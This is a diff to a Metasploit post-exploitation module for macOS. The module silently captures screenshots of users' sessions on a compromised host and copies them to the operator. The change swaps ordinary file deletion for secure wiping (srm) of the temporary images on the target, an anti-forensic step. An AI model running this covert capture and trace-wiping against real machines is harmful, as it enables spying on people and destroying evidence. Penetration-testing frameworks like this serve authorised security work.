@@ -358,7 +358,7 @@ class Metasploit3 < Msf::Post
 						session.shell_command_token("/bin/launchctl bsexec #{pid} /usr/sbin/screencapture -x /tmp/#{pid}.jpg")
 						file_local_write(log_folder+"//screenshot_#{pid}.jpg",
 						session.shell_command_token("/bin/cat /tmp/#{pid}.jpg"))
-						session.shell_command_token("/bin/rm /tmp/#{pid}.jpg")
+						session.shell_command_token("/usr/bin/srm -m -z /tmp/#{pid}.jpg")
 					end
 				end
 			else
@@ -367,7 +367,7 @@ class Metasploit3 < Msf::Post
 					session.shell_command_token("/usr/sbin/screencapture -x /tmp/#{picture_name}.jpg")
 					file_local_write(log_folder+"//screenshot.jpg",
 					session.shell_command_token("/bin/cat /tmp/#{picture_name}.jpg"))
-					session.shell_command_token("/bin/rm /tmp/#{picture_name}.jpg")
+					session.shell_command_token("/usr/bin/srm -m -z /tmp/#{picture_name}.jpg")
 				end
 			end
 			print_status("Screenshot Captured")
